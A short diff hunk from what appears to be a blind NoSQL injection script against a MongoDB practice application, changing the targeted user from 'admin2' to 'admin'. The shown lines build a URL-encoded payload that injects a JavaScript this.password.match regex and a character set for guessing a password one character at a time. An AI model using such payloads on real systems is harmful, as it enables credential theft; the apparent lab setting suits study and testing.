@@ -14,7 +14,7 @@ else:
 
 baseurl = "/mongodb/example2/?search="
 begin = "%27%26%26%20this.password.match(/^"
-user = "admin2"
+user = "admin"
 mid = "%5B"
 endurl = "%5D.*/)//+%00"
 baseregex = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
